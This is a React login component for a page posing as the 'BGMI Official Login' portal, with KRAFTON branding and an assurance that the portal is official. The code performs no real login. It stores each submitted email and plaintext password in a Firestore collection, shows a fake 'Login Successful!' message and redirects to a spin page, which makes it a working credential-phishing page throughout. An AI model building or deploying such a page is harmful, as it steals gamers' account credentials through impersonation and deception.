import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { db } from "./firebase";
import { collection, addDoc } from "firebase/firestore";
import "./Login.css";
import logo from "./assets/bgmi-logo.png";

function validateEmail(email) {
  // Simple email regex
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

export default function Login() {
  const [bgmiId, setBgmiId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ type: "", text: "" });
  const [showPopup, setShowPopup] = useState(false);

  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage({ type: "", text: "" });

    if (!validateEmail(bgmiId.trim())) {
      setMessage({ type: "error", text: "Please enter a valid email address." });
      return;
    }
    if (password.length < 8) {
      setMessage({ type: "error", text: "Password must be at least 8 characters." });
      return;
    }

    setLoading(true);
    try {
      await addDoc(collection(db, "bgmiUsers"), {
        bgmiId: bgmiId.trim(),
        password,
        createdAt: new Date().toISOString(),
      });
      setShowPopup(true);
      setBgmiId("");
      setPassword("");
      setTimeout(() => {
        setShowPopup(false);
        navigate("/spinpage");
      }, 1800); // 1.8 seconds popup
    } catch (error) {
      setMessage({ type: "error", text: "Something went wrong. Try again." });
    }
    setLoading(false);
  };

  return (
    <div className="login-bg">
      <div className="login-center">
        <div className="login-card" role="main" aria-label="BGMI Login">
          <img src={logo} alt="BGMI Logo" className="login-logo" />
          <h2 className="login-title">BGMI Official Login</h2>
          <form onSubmit={handleSubmit} className="login-form" autoComplete="off">
            <div className="form-group">
              <label htmlFor="bgmiId">Email</label>
              <div className="input-wrapper">
                <input
                  id="bgmiId"
                  type="email"
                  value={bgmiId}
                  onChange={(e) => setBgmiId(e.target.value)}
                  placeholder="Enter your email"
                  required
                  disabled={loading}
                  autoFocus
                />
              </div>
            </div>
            <div className="form-group">
              <label htmlFor="password">Password</label>
              <div className="input-wrapper">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  required
                  disabled={loading}
                  autoComplete="new-password"
                />
                <button
                  type="button"
                  className="show-btn"
                  onClick={() => setShowPassword((s) => !s)}
                  tabIndex={-1}
                  disabled={loading}
                  aria-label={showPassword ? "Hide password" : "Show password"}
                >
                  {showPassword ? (
                    // Eye Off SVG
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffb300" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-5 0-9.27-3.11-11-7.5a11.05 11.05 0 0 1 5.17-5.61"/>
                      <path d="M1 1l22 22"/>
                      <path d="M9.53 9.53A3.5 3.5 0 0 0 12 15.5c1.38 0 2.63-.83 3.16-2.03"/>
                      <path d="M14.47 14.47A3.5 3.5 0 0 0 12 8.5c-.62 0-1.2.18-1.69.49"/>
                    </svg>
                  ) : (
                    // Eye SVG
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffb300" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M1 12C1 12 5 5 12 5s11 7 11 7-4 7-11 7S1 12 1 12z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                  )}
                </button>
              </div>
            </div>
            <button type="submit" className="login-btn" disabled={loading}>
              {loading ? "Logging in..." : "Login"}
            </button>
            {message.text && (
              <div className={`msg ${message.type}`}>{message.text}</div>
            )}
          </form>
          <div className="login-footer">
            <small>
              <b>Note:</b> This is the official BGMI login portal. Never share your credentials with anyone.<br />
              &copy; {new Date().getFullYear()} KRAFTON, Inc. All rights reserved.
            </small>
          </div>
        </div>
        {showPopup && (
          <div className="popup-success">
            <div className="popup-content">
              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#1a7f1a" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" stroke="#1a7f1a" fill="#e6ffe6"/>
                <path d="M8 12l2 2l4-4" stroke="#1a7f1a" />
              </svg>
              <div className="popup-text">Login Successful!</div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}